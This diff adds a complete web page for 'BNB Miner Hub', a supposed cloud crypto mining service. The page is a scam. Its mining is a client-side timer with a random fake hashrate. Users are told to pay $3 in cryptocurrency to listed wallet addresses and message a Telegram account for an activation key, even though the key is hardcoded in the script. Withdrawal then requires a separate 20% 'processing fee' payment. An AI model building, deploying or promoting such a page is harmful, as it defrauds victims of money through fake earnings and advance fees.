@@ -1,0 +1,782 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <title>BNB Miner Hub | Premium Cloud Mining</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      background: radial-gradient(ellipse at 30% 20%, #0a0c1a, #010105);
+      font-family: 'Inter', sans-serif;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+      position: relative;
+      overflow-x: hidden;
+    }
+
+    .orb {
+      position: fixed;
+      border-radius: 50%;
+      filter: blur(90px);
+      z-index: 0;
+      pointer-events: none;
+    }
+    .orb1 { width: 45vw; height: 45vw; background: #c084fc; top: -15%; left: -15%; opacity: 0.25; animation: floatOrb 20s infinite alternate; }
+    .orb2 { width: 40vw; height: 40vw; background: #fbbf24; bottom: -20%; right: -10%; opacity: 0.25; animation: floatOrb2 24s infinite alternate; }
+    .orb3 { width: 30vw; height: 30vw; background: #3b82f6; top: 40%; left: 60%; opacity: 0.15; animation: floatOrb3 18s infinite alternate; }
+    @keyframes floatOrb { 0% { transform: translate(0,0) scale(1); } 100% { transform: translate(5%, 8%) scale(1.15); } }
+    @keyframes floatOrb2 { 0% { transform: translate(0,0) scale(1); } 100% { transform: translate(-6%, -5%) scale(1.2); } }
+    @keyframes floatOrb3 { 0% { transform: translate(0,0); } 100% { transform: translate(10%, -8%); } }
+
+    .app-wrapper {
+      position: relative;
+      z-index: 10;
+      width: 100%;
+      max-width: 540px;
+      margin: 0 auto;
+    }
+
+    .glass-master {
+      background: rgba(12, 16, 28, 0.82);
+      backdrop-filter: blur(18px);
+      border-radius: 3rem;
+      border: 1px solid rgba(251, 191, 36, 0.45);
+      box-shadow: 0 30px 55px -20px rgba(0,0,0,0.8), 0 0 0 1px rgba(192, 132, 252, 0.25);
+      overflow: hidden;
+    }
+
+    .hero {
+      background: linear-gradient(125deg, #0c1122, #060917);
+      padding: 24px 22px;
+      text-align: center;
+      border-bottom: 1px solid rgba(251, 191, 36, 0.6);
+    }
+    .hero h1 {
+      font-size: 2rem;
+      font-weight: 800;
+      background: linear-gradient(135deg, #FBBF24, #F59E0B, #C084FC, #A855F7);
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+      letter-spacing: -0.5px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      text-shadow: 0 0 20px rgba(251,191,36,0.2);
+    }
+    .hero-badge {
+      background: linear-gradient(95deg, rgba(192,132,252,0.3), rgba(251,191,36,0.2));
+      backdrop-filter: blur(4px);
+      display: inline-block;
+      padding: 5px 18px;
+      border-radius: 40px;
+      font-size: 0.7rem;
+      font-weight: 600;
+      margin-top: 12px;
+      color: #FCD34D;
+      border: 1px solid rgba(251,191,36,0.5);
+    }
+
+    .tabs-row {
+      display: flex;
+      background: rgba(0,0,0,0.5);
+      gap: 6px;
+      padding: 8px 16px 0 16px;
+    }
+    .tab-btn {
+      flex: 1;
+      background: transparent;
+      border: none;
+      padding: 14px 0;
+      font-weight: 700;
+      font-size: 0.9rem;
+      color: #9CA3AF;
+      cursor: pointer;
+      transition: all 0.2s;
+      font-family: inherit;
+      border-radius: 2rem 2rem 0 0;
+    }
+    .tab-btn.active {
+      color: #FBBF24;
+      background: linear-gradient(180deg, rgba(251,191,36,0.15), transparent);
+      text-shadow: 0 0 8px rgba(251,191,36,0.5);
+      border-bottom: 2px solid #FBBF24;
+    }
+
+    .tab-pane {
+      display: none;
+      padding: 22px 18px;
+      animation: fadeSlide 0.35s ease;
+    }
+    .tab-pane.active-pane {
+      display: block;
+    }
+    @keyframes fadeSlide {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .card-vibrant {
+      background: linear-gradient(145deg, rgba(20, 26, 42, 0.85), rgba(12, 16, 30, 0.9));
+      border-radius: 1.8rem;
+      padding: 1.4rem;
+      margin-bottom: 1.4rem;
+      border: 1px solid rgba(192, 132, 252, 0.5);
+      box-shadow: 0 8px 24px rgba(0,0,0,0.3);
+    }
+    .balance-card {
+      background: linear-gradient(125deg, #111a2b, #0a0f1e);
+      border-left: 5px solid #FBBF24;
+      position: relative;
+      overflow: hidden;
+    }
+    .balance-card::after {
+      content: '';
+      position: absolute;
+      top: -20%;
+      right: -15%;
+      width: 140px;
+      height: 140px;
+      background: radial-gradient(circle, rgba(251,191,36,0.2), transparent);
+      border-radius: 50%;
+    }
+
+    .mining-status-row {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      flex-wrap: wrap;
+      margin-bottom: 12px;
+    }
+    .led-dot {
+      width: 12px;
+      height: 12px;
+      border-radius: 50%;
+      background: #4B5563;
+      transition: all 0.2s;
+    }
+    .led-active {
+      background: #FBBF24;
+      box-shadow: 0 0 14px #FBBF24;
+    }
+    .hash-badge {
+      background: linear-gradient(95deg, #7C3AED, #A855F7);
+      padding: 4px 14px;
+      border-radius: 30px;
+      font-size: 0.7rem;
+      font-weight: 700;
+      color: white;
+    }
+    .bnb-main {
+      font-size: 2.7rem;
+      font-weight: 800;
+      background: linear-gradient(120deg, #FBBF24, #F59E0B);
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+      letter-spacing: -1px;
+      word-break: break-word;
+    }
+    .stats-text {
+      color: #C4B5FD;
+      font-weight: 500;
+    }
+
+    input, .input-style {
+      width: 100%;
+      background: #0f1525;
+      border: 1.5px solid #374151;
+      border-radius: 1.5rem;
+      padding: 14px 18px;
+      color: #F3F4F6;
+      font-family: inherit;
+      font-weight: 500;
+      margin: 10px 0;
+      transition: 0.2s;
+    }
+    input:focus {
+      outline: none;
+      border-color: #FBBF24;
+      box-shadow: 0 0 0 3px rgba(251,191,36,0.25);
+    }
+    input::placeholder { color: #6B7280; }
+
+    .btn {
+      width: 100%;
+      padding: 14px;
+      border-radius: 2rem;
+      font-weight: 700;
+      font-family: inherit;
+      border: none;
+      cursor: pointer;
+      transition: 0.2s;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      font-size: 0.9rem;
+    }
+    .btn-gold {
+      background: linear-gradient(100deg, #FBBF24, #F59E0B);
+      color: #0a0c18;
+      box-shadow: 0 8px 20px rgba(251,191,36,0.35);
+    }
+    .btn-purple {
+      background: linear-gradient(95deg, #8B5CF6, #A855F7);
+      color: white;
+    }
+    .btn-dark {
+      background: #1F2A3E;
+      color: #E2E8F0;
+      border: 1px solid #475569;
+    }
+    .flex-duo {
+      display: flex;
+      gap: 12px;
+      margin-top: 8px;
+    }
+
+    .payment-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 10px;
+      max-height: 220px;
+      overflow-y: auto;
+      margin: 16px 0;
+      padding-right: 5px;
+    }
+    .method-tile {
+      background: linear-gradient(145deg, #121a2c, #0c1122);
+      border-radius: 1.2rem;
+      padding: 8px 4px;
+      text-align: center;
+      cursor: pointer;
+      border: 1px solid #2d3a5e;
+      transition: all 0.15s;
+    }
+    .method-tile.selected {
+      border-color: #FBBF24;
+      background: linear-gradient(145deg, #1e2a46, #121b30);
+      box-shadow: 0 0 12px rgba(251,191,36,0.4);
+    }
+    .method-icon { font-size: 1.7rem; font-weight: 700; color: #FBBF24; }
+    .method-name { font-size: 0.7rem; font-weight: 600; margin-top: 4px; color: #C4B5FD; }
+    .method-amount { font-size: 0.65rem; color: #FCD34D; font-weight: 600; }
+
+    .address-glass {
+      background: #0a1020;
+      border-radius: 1.2rem;
+      padding: 12px;
+      word-break: break-all;
+      font-family: monospace;
+      font-size: 0.7rem;
+      margin: 10px 0;
+      border: 1px solid #4c1d95;
+      color: #FDE047;
+    }
+    .copy-sm {
+      background: #2d3748;
+      border: none;
+      padding: 6px 14px;
+      border-radius: 2rem;
+      font-size: 0.7rem;
+      cursor: pointer;
+      color: #FBBF24;
+      font-weight: 600;
+    }
+    .step-line {
+      display: flex;
+      gap: 12px;
+      margin: 12px 0;
+      align-items: center;
+      color: #E0E7FF;
+    }
+    .step-number {
+      width: 26px;
+      height: 26px;
+      background: linear-gradient(135deg, #FBBF24, #F59E0B);
+      border-radius: 60px;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: 800;
+      color: #0a0c18;
+    }
+
+    .withdraw-info, .fee-info {
+      background: rgba(139, 92, 246, 0.2);
+      border-radius: 1.2rem;
+      padding: 12px;
+      margin: 12px 0;
+      border-left: 4px solid #A855F7;
+      color: #DDD6FE;
+    }
+    .hidden { display: none; }
+    .text-glow { color: #FBBF24; font-weight: 700; text-shadow: 0 0 4px rgba(251,191,36,0.5); }
+
+    .toast-notify {
+      position: fixed;
+      bottom: 25px;
+      left: 50%;
+      transform: translateX(-50%) scale(0.9);
+      background: #1F2A44;
+      backdrop-filter: blur(12px);
+      padding: 12px 28px;
+      border-radius: 60px;
+      color: #FEF9C3;
+      z-index: 200;
+      opacity: 0;
+      transition: 0.2s;
+      pointer-events: none;
+      font-weight: 600;
+      border-left: 5px solid #FBBF24;
+      font-size: 0.85rem;
+    }
+
+    .modal-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.85);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 1000;
+      visibility: hidden;
+      opacity: 0;
+      transition: 0.2s;
+    }
+    .modal-overlay.active {
+      visibility: visible;
+      opacity: 1;
+    }
+    .modal-card {
+      background: linear-gradient(145deg, #121826, #0a0f1c);
+      border-radius: 2rem;
+      padding: 28px;
+      max-width: 340px;
+      width: 85%;
+      border: 1px solid #FBBF24;
+      color: #F3F4F6;
+    }
+    .loader-mini {
+      width: 18px;
+      height: 18px;
+      border: 2px solid #FBBF24;
+      border-top-color: transparent;
+      border-radius: 50%;
+      animation: spin 0.7s linear infinite;
+      display: inline-block;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    
+    h3, h4, p, span, div { color: #F1F5F9; }
+    .min-requirement {
+      background: rgba(251,191,36,0.15);
+      border-radius: 1rem;
+      padding: 8px;
+      text-align: center;
+      font-size: 0.7rem;
+      margin-top: 8px;
+      color: #FCD34D;
+    }
+    .price-note {
+      font-size: 0.65rem;
+      color: #9CA3AF;
+      text-align: center;
+      margin-top: 5px;
+    }
+  </style>
+</head>
+<body>
+<div class="orb orb1"></div>
+<div class="orb orb2"></div>
+<div class="orb orb3"></div>
+<div class="app-wrapper">
+  <div class="glass-master">
+    <div class="hero">
+      <h1><span>💎</span> BNB MINER HUB</h1>
+      <div class="hero-badge">⚡ CLOUD MINING 2.0 | HIGH YIELD</div>
+    </div>
+    <div class="tabs-row">
+      <button class="tab-btn active" data-tab="mine">⛏️ MINING</button>
+      <button class="tab-btn" data-tab="guide">📘 GUIDE</button>
+      <button class="tab-btn" data-tab="support">💬 SUPPORT</button>
+    </div>
+
+    <!-- MINING TAB -->
+    <div id="minePane" class="tab-pane active-pane">
+      <div class="card-vibrant balance-card">
+        <div class="mining-status-row">
+          <div class="led-dot" id="miningLed"></div>
+          <span id="miningStatusText" style="font-weight:700; color:#FCD34D;">⚙️ STAND BY</span>
+          <span class="hash-badge" id="hashrateValue">0 H/s</span>
+        </div>
+        <div class="bnb-main" id="bnbBalanceMain">0.0000000</div>
+        <div style="display: flex; justify-content: space-between; margin-top: 8px;">
+          <span class="stats-text">💰 ≈ $<span id="usdBalanceSpan">0.00</span> USD</span>
+          <span class="stats-text">⚡ RATE: 0.000001 BNB/s</span>
+        </div>
+        <div class="price-note">1 BNB = $613.33 USD</div>
+      </div>
+
+      <div class="card-vibrant">
+        <input type="text" id="activationInput" class="input-style" placeholder="🔑 Enter your activation key (purchase via Telegram)">
+        <button class="btn btn-gold" id="verifyKeyBtn">✨ UNLOCK MINER</button>
+        <div class="flex-duo">
+          <button class="btn btn-purple" id="startMineAction" disabled>▶ START MINING</button>
+          <button class="btn btn-dark" id="stopMineAction" disabled>⏹ STOP MINING</button>
+        </div>
+      </div>
+
+      <!-- ACTIVATION PAYMENT ($3) -->
+      <div class="card-vibrant">
+        <div style="display: flex; justify-content: space-between; align-items: center;">
+          <h3 style="color: #FBBF24; font-weight:800;">🌟 GET ACTIVATION KEY</h3>
+          <span style="background: linear-gradient(95deg,#FBBF24,#F59E0B); padding:6px 16px; border-radius: 60px; font-weight:800; color:#0a0c18;">$3 USD</span>
+        </div>
+        <p style="margin: 8px 0 4px; color:#C4B5FD;">⚡ Pay $3 → receive your unique key → activate lifetime mining</p>
+        <div class="payment-grid" id="cryptoMethodsGrid"></div>
+        <div class="address-glass">
+          <div id="dynamicPayAddress" style="font-weight:600; color:#FDE047;">bc1qkrvuxrrjm9t96jdng86mhep29rvf4ezupepakx</div>
+          <div id="dynamicPayAmount" style="font-size:0.7rem; margin-top:5px; color:#FBBF24;">≈ 0.000045 BTC ($3)</div>
+          <button class="copy-sm" id="copyPayBtn" style="margin-top:8px;">📋 Copy Address</button>
+        </div>
+        <div class="step-line"><div class="step-number">1</div><div>Send <strong class="text-glow">$3 equivalent</strong> to the address above</div></div>
+        <div class="step-line"><div class="step-number">2</div><div>Screenshot your transaction proof</div></div>
+        <div class="step-line"><div class="step-number">3</div><div>Message <strong style="color:#FBBF24;">@CryptoMinerApp10</strong> on Telegram with proof</div></div>
+        <div class="step-line"><div class="step-number">4</div><div>Receive your unique key & enter it above to mine!</div></div>
+        <button class="btn btn-purple" onclick="window.open('https://t.me/CryptoMinerApp10', '_blank')">💬 CONTACT TELEGRAM FOR KEY</button>
+      </div>
+
+      <!-- WITHDRAWAL SECTION - MIN 0.9 BNB, 20% FEE -->
+      <div class="card-vibrant">
+        <h4 style="color:#FBBF24; font-weight:700;">🏦 WITHDRAW BNB</h4>
+        <input type="text" id="bnbWalletAddr" class="input-style" placeholder="Your BNB (BEP-20) wallet address">
+        <div class="min-requirement">
+          ⚠️ Minimum withdrawal: <strong style="color:#FBBF24;">0.9 BNB</strong> (~$552.00 USD)
+        </div>
+        <div id="withdrawPreview" class="withdraw-info hidden">
+          <div>📤 Amount: <strong id="previewBnb" style="color:#FBBF24;">0.0000 BNB</strong> (~$<span id="previewUsd">0.00</span>)</div>
+          <div>💸 Processing fee (20%): <span style="color:#F59E0B;">$<span id="previewFee">0.00</span></span> <span style="font-size:0.7rem;">(paid separately)</span></div>
+          <div>✅ You'll receive full $<span id="previewNet">0.00</span> worth of BNB after fee confirmation</div>
+        </div>
+        <div id="feeRequestPanel" class="fee-info hidden">
+          <div class="loader-mini" style="margin-right: 8px; vertical-align: middle;"></div>
+          <span style="font-weight:700; color:#FBBF24;">Fee payment required (20%)</span>
+          <p style="margin-top: 6px;">Send <strong id="requiredFeeAmount" style="color:#F59E0B;">$0.00</strong> (20% processing fee) to the BNB address below:</p>
+          <div class="address-glass" id="feeAddressDisplay" style="color:#FDE047;">0x8Ed272B8003eC72F434929EB7E712dea2772A360</div>
+          <button class="copy-sm" id="copyFeeBtn">📋 Copy Fee Address</button>
+          <p style="font-size:0.7rem; margin-top:8px; color:#A78BFA;">After payment, contact @CryptoMinerApp10 with TXID to finalize withdrawal.</p>
+        </div>
+        <button class="btn btn-purple" id="withdrawTriggerBtn">💸 REQUEST WITHDRAWAL</button>
+      </div>
+    </div>
+
+    <!-- GUIDE TAB - 3 steps only -->
+    <div id="guidePane" class="tab-pane">
+      <div class="card-vibrant">
+        <h3 style="color:#FBBF24;">⚡ How BNB Mining Works</h3>
+        <div class="step-line"><div class="step-number">1</div><div>Activate: <strong class="text-glow">$3 payment</strong> → get unique key via Telegram</div></div>
+        <div class="step-line"><div class="step-number">2</div><div>Enter key & start mining: <strong style="color:#FBBF24;">0.000001 BNB per second</strong></div></div>
+        <div class="step-line"><div class="step-number">3</div><div>Accumulate until <strong style="color:#FBBF24;">0.9 BNB minimum</strong> → withdraw to your wallet</div></div>
+        <h4 style="margin-top: 20px; color:#C084FC;">✨ Premium advantages</h4>
+        <ul style="padding-left:20px; color:#DDD6FE;">
+          <li>🔹 • 24/7 cloud mining simulation</li>
+          <li>🔹 • Multi-currency payments (BTC, ETH, USDT, BNB, DOGE, SOL, TON, etc)</li>
+          <li>🔹 • Instant key delivery after payment proof</li>
+          <li>🔹 • Secure & transparent withdrawals (20% processing fee)</li>
+        </ul>
+        <div class="price-note" style="margin-top: 12px;">💰 Current BNB Price: $613.33 USD</div>
+      </div>
+    </div>
+
+    <!-- SUPPORT TAB -->
+    <div id="supportPane" class="tab-pane">
+      <div class="card-vibrant">
+        <h3 style="color:#FBBF24;">📞 Need Help?</h3>
+        <p style="color:#C4B5FD;">Our support team is active 24/7 on Telegram. For activation key, withdrawal issues or technical assistance, reach out directly.</p>
+        <button class="btn btn-gold" onclick="window.open('https://t.me/CryptoMinerApp10', '_blank')" style="margin: 15px 0;">📱 Message @CryptoMinerApp10</button>
+        <div style="background:rgba(139,92,246,0.2); border-radius:1.2rem; padding:12px; margin-top:6px;">
+          <p style="font-size:0.8rem; color:#FCD34D;">⚠️ <strong>Activation key is NOT public</strong> — you must purchase via Telegram to receive your unique key.</p>
+        </div>
+      </div>
+      <div class="card-vibrant">
+        <h4 style="color:#FBBF24;">📢 Platform Updates</h4>
+        <p style="color:#C4B5FD;">✅ Mar 2025: $3 activation promo + 12+ crypto methods<br>✅ Feb 2025: Minimum withdrawal 0.9 BNB | 20% processing fee<br>✅ Jan 2025: Added Solana, Ton, MATIC payments<br>✅ Current BNB price: $613.33</p>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div id="globalToast" class="toast-notify">Notification</div>
+<div id="withdrawModal" class="modal-overlay">
+  <div class="modal-card">
+    <h3 style="color:#FBBF24;">🔐 Confirm Withdrawal</h3>
+    <p>Withdraw <strong id="modalBnbAmount" style="color:#FBBF24;">0.0000 BNB</strong> ≈ $<span id="modalUsdAmount">0</span></p>
+    <p>20% fee (<strong id="modalFeeAmount" style="color:#F59E0B;">$0</strong>) paid separately.<br>You'll receive full amount after fee confirmation.</p>
+    <div style="display: flex; gap: 12px; margin-top: 20px;">
+      <button class="btn btn-dark" id="cancelModalBtn" style="flex:1;">Cancel</button>
+      <button class="btn btn-gold" id="confirmWithdrawBtn" style="flex:1;">Confirm</button>
+    </div>
+  </div>
+</div>
+
+<script>
+  // CONSTANTS - Updated with new price and 20% fee
+  const BNB_PRICE = 613.33;
+  const RATE_PER_SEC = 0.000001;
+  const MIN_WITHDRAW_BNB = 0.9;
+  const ACTIVATION_KEY = "JKALWOZHBD";
+  const FEE_PERCENT = 0.20;  // 20% processing fee
+
+  let balance = 0;
+  let isActivated = false;
+  let miningActive = false;
+  let miningTimer = null;
+  let lastTimestamp = Date.now();
+  let userBnbWallet = "";
+  let selectedMethod = "btc";
+
+  const paymentMethods = {
+    btc: { name:"BTC", icon:"₿", addr:"bc1qkrvuxrrjm9t96jdng86mhep29rvf4ezupepakx", amountDesc:"≈ 0.000045 BTC", usdVal:3 },
+    eth: { name:"ETH", icon:"⟠", addr:"0x8Ed272B8003eC72F434929EB7E712dea2772A360", amountDesc:"≈ 0.00115 ETH", usdVal:3 },
+    usdt_bep20: { name:"USDT(BEP20)", icon:"USDT", addr:"0x8Ed272B8003eC72F434929EB7E712dea2772A360", amountDesc:"3 USDT", usdVal:3 },
+    usdt_erc20: { name:"USDT(ERC20)", icon:"USDT", addr:"0x8Ed272B8003eC72F434929EB7E712dea2772A360", amountDesc:"3 USDT", usdVal:3 },
+    usdt_polygon: { name:"USDT(Polygon)", icon:"USDT", addr:"0x8Ed272B8003eC72F434929EB7E712dea2772A360", amountDesc:"3 USDT", usdVal:3 },
+    doge: { name:"DOGE", icon:"Ð", addr:"DBdHkdK9cSnTsbSU7fC3UsEScGk3Vh5MQj", amountDesc:"≈ 23 DOGE", usdVal:3 },
+    sol: { name:"SOL", icon:"◎", addr:"BJRbjgLW13DwKkJvCTyXG9WTZoNVB4FQRsBKh4jN3TPH", amountDesc:"≈ 0.023 SOL", usdVal:3 },
+    ton: { name:"TON", icon:"⧫", addr:"UQCAmLdC9CScLicYOBjLuRh-GZN9CGGej5D04Bv5wsFzygjP", amountDesc:"≈ 2 TON", usdVal:3 },
+    bnb: { name:"BNB", icon:"🟡", addr:"0x8Ed272B8003eC72F434929EB7E712dea2772A360", amountDesc:"≈ 0.0052 BNB", usdVal:3 },
+    ltc: { name:"LTC", icon:"Ł", addr:"LS8Cb6ve24tRaULwj9XfoYJDcRTbSbKr2s", amountDesc:"≈ 0.038 LTC", usdVal:3 },
+    trx: { name:"TRX", icon:"TRX", addr:"TNF2n1mc56nbXwHi1FXrXckXc74RWuYDux", amountDesc:"≈ 11 TRX", usdVal:3 },
+    matic: { name:"MATIC", icon:"MATIC", addr:"0x8Ed272B8003eC72F434929EB7E712dea2772A360", amountDesc:"≈ 24 MATIC", usdVal:3 }
+  };
+
+  // DOM Elements
+  const bnbSpan = document.getElementById("bnbBalanceMain");
+  const usdSpan = document.getElementById("usdBalanceSpan");
+  const miningLed = document.getElementById("miningLed");
+  const miningStatusSpan = document.getElementById("miningStatusText");
+  const hashrateSpan = document.getElementById("hashrateValue");
+  const startBtn = document.getElementById("startMineAction");
+  const stopBtn = document.getElementById("stopMineAction");
+  const verifyBtn = document.getElementById("verifyKeyBtn");
+  const keyInput = document.getElementById("activationInput");
+  const withdrawWallet = document.getElementById("bnbWalletAddr");
+  const withdrawPreview = document.getElementById("withdrawPreview");
+  const previewBnb = document.getElementById("previewBnb");
+  const previewUsd = document.getElementById("previewUsd");
+  const previewFee = document.getElementById("previewFee");
+  const previewNet = document.getElementById("previewNet");
+  const feePanel = document.getElementById("feeRequestPanel");
+  const requiredFeeSpan = document.getElementById("requiredFeeAmount");
+  const withdrawTrigger = document.getElementById("withdrawTriggerBtn");
+  const modalDiv = document.getElementById("withdrawModal");
+  const modalBnbAmount = document.getElementById("modalBnbAmount");
+  const modalUsdAmount = document.getElementById("modalUsdAmount");
+  const modalFeeAmount = document.getElementById("modalFeeAmount");
+
+  function showToast(msg, isError = false) {
+    const toast = document.getElementById("globalToast");
+    toast.innerText = msg;
+    toast.style.opacity = "1";
+    toast.style.transform = "translateX(-50%) scale(1)";
+    toast.style.background = isError ? "#7f1a1add" : "#1e293bdd";
+    setTimeout(() => {
+      toast.style.opacity = "0";
+      toast.style.transform = "translateX(-50%) scale(0.9)";
+    }, 2800);
+  }
+
+  function saveData() {
+    const data = { balance, isActivated, miningActive, userBnbWallet, lastTimestamp: Date.now() };
+    localStorage.setItem("bnb_miner_hub_v4", JSON.stringify(data));
+  }
+
+  function loadSavedData() {
+    const raw = localStorage.getItem("bnb_miner_hub_v4");
+    if(raw) {
+      try {
+        const data = JSON.parse(raw);
+        balance = data.balance || 0;
+        isActivated = data.isActivated || false;
+        miningActive = data.miningActive || false;
+        userBnbWallet = data.userBnbWallet || "";
+        if(userBnbWallet) withdrawWallet.value = userBnbWallet;
+        if(miningActive && isActivated) {
+          const diffSec = (Date.now() - (data.lastTimestamp || Date.now())) / 1000;
+          if(diffSec > 0 && diffSec < 86400) balance += diffSec * RATE_PER_SEC;
+          if(balance < 0) balance = 0;
+        }
+        updateUI();
+        if(miningActive && isActivated) startMiningInternal();
+        else if(miningTimer) clearInterval(miningTimer);
+      } catch(e) {}
+    }
+    updateWithdrawPreview();
+  }
+
+  function updateUI() {
+    bnbSpan.innerText = balance.toFixed(7);
+    usdSpan.innerText = (balance * BNB_PRICE).toFixed(2);
+    if(isActivated) {
+      verifyBtn.innerText = "✅ ACTIVE";
+      verifyBtn.disabled = true;
+      startBtn.disabled = false;
+    } else {
+      startBtn.disabled = true;
+    }
+    if(miningActive && isActivated) {
+      miningLed.classList.add("led-active");
+      miningStatusSpan.innerText = "⚡ MINING ACTIVE";
+    } else {
+      miningLed.classList.remove("led-active");
+      miningStatusSpan.innerText = "⏹ IDLE";
+    }
+    stopBtn.disabled = !miningActive;
+    updateWithdrawPreview();
+  }
+
+  function startMiningInternal() {
+    if(miningTimer) clearInterval(miningTimer);
+    miningActive = true;
+    miningTimer = setInterval(() => {
+      if(miningActive && isActivated) {
+        balance += RATE_PER_SEC;
+        updateUI();
+        saveData();
+        const fakeHR = Math.floor(Math.random() * 110) + 70;
+        hashrateSpan.innerText = fakeHR + " H/s";
+      }
+    }, 1000);
+    updateUI();
+    saveData();
+  }
+
+  function stopMiningInternal() {
+    if(miningTimer) clearInterval(miningTimer);
+    miningTimer = null;
+    miningActive = false;
+    hashrateSpan.innerText = "0 H/s";
+    updateUI();
+    saveData();
+  }
+
+  function updateWithdrawPreview() {
+    if(balance >= MIN_WITHDRAW_BNB) {
+      withdrawPreview.classList.remove("hidden");
+      const usdVal = balance * BNB_PRICE;
+      const feeVal = usdVal * FEE_PERCENT;
+      previewBnb.innerText = balance.toFixed(7) + " BNB";
+      previewUsd.innerText = usdVal.toFixed(2);
+      previewFee.innerText = feeVal.toFixed(2);
+      previewNet.innerText = usdVal.toFixed(2);
+    } else {
+      withdrawPreview.classList.add("hidden");
+    }
+  }
+
+  function renderPaymentMethods() {
+    const grid = document.getElementById("cryptoMethodsGrid");
+    grid.innerHTML = "";
+    Object.keys(paymentMethods).forEach(key => {
+      const m = paymentMethods[key];
+      const tile = document.createElement("div");
+      tile.className = `method-tile ${selectedMethod === key ? 'selected' : ''}`;
+      tile.setAttribute("data-method", key);
+      tile.innerHTML = `<div class="method-icon">${m.icon}</div><div class="method-name">${m.name}</div><div class="method-amount">${m.amountDesc}</div>`;
+      tile.onclick = () => {
+        document.querySelectorAll(".method-tile").forEach(t => t.classList.remove("selected"));
+        tile.classList.add("selected");
+        selectedMethod = key;
+        updatePayAddress();
+      };
+      grid.appendChild(tile);
+    });
+    updatePayAddress();
+  }
+
+  function updatePayAddress() {
+    const m = paymentMethods[selectedMethod];
+    document.getElementById("dynamicPayAddress").innerText = m.addr;
+    document.getElementById("dynamicPayAmount").innerHTML = `${m.amountDesc} ($${m.usdVal} USD)`;
+  }
+
+  withdrawTrigger.onclick = () => {
+    if(!isActivated) { showToast("❌ Activate miner first (get key from Telegram)", true); return; }
+    if(balance < MIN_WITHDRAW_BNB) { showToast(`Minimum withdrawal: ${MIN_WITHDRAW_BNB} BNB (≈ $${(MIN_WITHDRAW_BNB * BNB_PRICE).toFixed(2)})`, true); return; }
+    const wallet = withdrawWallet.value.trim();
+    if(!wallet) { showToast("Enter your BNB wallet address", true); return; }
+    userBnbWallet = wallet;
+    saveData();
+    const usdTotal = balance * BNB_PRICE;
+    const feeVal = usdTotal * FEE_PERCENT;
+    modalBnbAmount.innerText = balance.toFixed(7);
+    modalUsdAmount.innerText = usdTotal.toFixed(2);
+    modalFeeAmount.innerText = feeVal.toFixed(2);
+    modalDiv.classList.add("active");
+  };
+  document.getElementById("confirmWithdrawBtn").onclick = () => {
+    modalDiv.classList.remove("active");
+    const usdTotal = balance * BNB_PRICE;
+    const feeVal = usdTotal * FEE_PERCENT;
+    requiredFeeSpan.innerText = `$${feeVal.toFixed(2)}`;
+    feePanel.classList.remove("hidden");
+    showToast("Withdrawal initiated: pay 20% processing fee to finalize", false);
+    saveData();
+  };
+  document.getElementById("cancelModalBtn").onclick = () => modalDiv.classList.remove("active");
+
+  verifyBtn.onclick = () => {
+    const entered = keyInput.value.trim();
+    if(entered === ACTIVATION_KEY) {
+      isActivated = true;
+      updateUI();
+      saveData();
+      showToast("✅ Miner activated! Start mining now.", false);
+    } else {
+      showToast("❌ Invalid key. Purchase your key via Telegram (@CryptoMinerApp10) to get the correct code.", true);
+    }
+  };
+  startBtn.onclick = () => { if(isActivated && !miningActive) startMiningInternal(); };
+  stopBtn.onclick = () => { if(miningActive) stopMiningInternal(); };
+  document.getElementById("copyPayBtn").onclick = () => {
+    const addr = paymentMethods[selectedMethod].addr;
+    navigator.clipboard.writeText(addr);
+    showToast("Address copied", false);
+  };
+  document.getElementById("copyFeeBtn").onclick = () => {
+    navigator.clipboard.writeText("0x8Ed272B8003eC72F434929EB7E712dea2772A360");
+    showToast("Fee address copied", false);
+  };
+  withdrawWallet.addEventListener("input", (e) => { userBnbWallet = e.target.value; saveData(); });
+
+  document.querySelectorAll(".tab-btn").forEach(btn => {
+    btn.addEventListener("click", () => {
+      document.querySelectorAll(".tab-btn").forEach(b => b.classList.remove("active"));
+      btn.classList.add("active");
+      const tabId = btn.getAttribute("data-tab");
+      document.querySelectorAll(".tab-pane").forEach(p => p.classList.remove("active-pane"));
+      if(tabId === "mine") document.getElementById("minePane").classList.add("active-pane");
+      if(tabId === "guide") document.getElementById("guidePane").classList.add("active-pane");
+      if(tabId === "support") document.getElementById("supportPane").classList.add("active-pane");
+    });
+  });
+
+  renderPaymentMethods();
+  loadSavedData();
+  setInterval(() => { if(miningActive) saveData(); }, 2000);
+</script>
+</body>
+</html>
